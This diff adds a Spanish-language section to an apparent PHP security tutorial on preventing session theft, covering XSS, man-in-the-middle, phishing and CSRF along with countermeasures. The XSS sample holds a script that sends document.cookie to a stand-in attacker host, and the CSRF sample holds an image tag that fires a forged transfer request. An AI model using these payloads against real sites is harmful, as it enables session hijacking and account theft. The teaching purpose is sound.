@@ -548,6 +548,85 @@ header("Location: index.php");
 | **Biométrica**                             | Utiliza datos biométricos como huellas digitales o reconocimiento facial.                                                 | Se implementa generalmente en aplicaciones móviles, con PHP manejando los datos en el backend.              | Altamente seguro, pero depende del soporte del dispositivo.    |
 | **CAPTCHA**                                | Protege el formulario de inicio de sesión de bots y ataques de fuerza bruta.                                              | Usa `Google reCAPTCHA` para validar la autenticidad del usuario.                                            | Buena medida adicional para formularios públicos.              |
 
+### Protegerse contra robos de sesión
+
+A continuación, se describen algunos métodos comunes utilizados para robar la sesión de un usuario, junto con las contramedidas necesarias para evitar estos ataques. 
+
+#### 1. **Ataque de Cross-Site Scripting (XSS)**
+- **Descripción**: Los ataques XSS aprovechan vulnerabilidades en el código para inyectar scripts maliciosos en páginas web visitadas por otros usuarios. Estos scripts pueden acceder a las cookies de sesión y enviarlas al atacante.
+- **Ejemplo**:
+
+```html
+<input type="text" name="comentario" value="<script>fetch('https://attacker.com?cookie=' + document.cookie)</script>">
+```
+
+El código inyectado envía la cookie de sesión a una URL controlada por el atacante.
+
+- **Contramedidas**:
+  - **Escapar y sanear entradas**: Utiliza funciones como `htmlspecialchars()` en PHP para escapar caracteres especiales.
+
+    ```php
+    $comentario = htmlspecialchars($_POST['comentario'], ENT_QUOTES, 'UTF-8');
+    ```
+
+  - **Política de Seguridad de Contenidos (CSP)**: Implementa CSP para restringir el origen de scripts.
+
+    ```http
+    Content-Security-Policy: script-src 'self';
+    ```
+
+#### 2. **Ataque de Man-in-the-Middle (MitM)**
+- **Descripción**: Si el sitio no utiliza HTTPS, un atacante puede interceptar el tráfico y capturar cookies de sesión no cifradas.
+- **Ejemplo**: El atacante usa herramientas como Wireshark para capturar cookies en una red pública.
+- **Contramedidas**:
+  - **Usar HTTPS**: Asegura que todas las conexiones sean a través de HTTPS.
+  - **Configurar cookies como `Secure`**:
+
+    ```php
+    session_set_cookie_params(['secure' => true]);
+    ```
+
+#### 3. **Robo de Cookies con Ingeniería Social o Phishing**
+- **Descripción**: El atacante engaña al usuario para que acceda a un enlace malicioso y revela su cookie de sesión.
+- **Ejemplo**: El atacante envía un enlace de phishing simulando la página de inicio de sesión.
+- **Contramedidas**:
+  - **Educación sobre phishing**: Enseña a los usuarios a identificar sitios y correos fraudulentos.
+  - **Autenticación de dos factores (2FA)**: Añade una capa extra de seguridad.
+
+    ```php
+    // Ejemplo usando una biblioteca de 2FA como Google Authenticator
+    require 'vendor/autoload.php';
+    ```
+
+#### 4. **Cross-Site Request Forgery (CSRF)**
+- **Descripción**: CSRF explota la confianza del navegador para realizar solicitudes no autorizadas en nombre del usuario autenticado.
+- **Ejemplo**: Un enlace malicioso ejecuta una solicitud usando la sesión activa del usuario.
+
+```html
+<img src="https://tusitio.com/transferir?monto=100&cuenta=atacante">
+```
+
+- **Contramedidas**:
+  - **Uso de tokens CSRF**:
+
+    ```php
+    // Generar token
+    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
+    echo '<input type="hidden" name="csrf_token" value="'.$_SESSION['csrf_token'].'">';
+    
+    // Validar token
+    if ($_POST['csrf_token'] !== $_SESSION['csrf_token']) {
+        die('Solicitud inválida');
+    }
+    ```
+
+  - **Configurar cookies con `SameSite`**:
+
+    ```php
+    session_set_cookie_params(['samesite' => 'Strict']);
+    ```
+
+
 
 ## 4.6 Referencias
 
